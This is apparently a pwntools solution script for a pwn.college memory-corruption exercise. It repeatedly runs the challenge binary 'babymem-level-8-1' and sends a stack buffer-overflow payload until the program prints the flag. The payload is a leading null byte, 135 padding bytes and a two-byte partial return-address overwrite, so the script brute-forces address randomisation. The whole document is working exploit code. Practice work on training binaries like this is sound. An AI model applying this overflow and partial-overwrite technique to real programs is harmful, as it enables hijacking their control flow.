from pwn import *

while True:
    p = process('/challenge/babymem-level-8-1')

    p.recvuntil('Payload size:')
    p.sendline(b'200')

    payload = b'\0' + b'A' * 135 + p16(0x1c29)

    #p.recvline('Send your payload')
    p.send(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
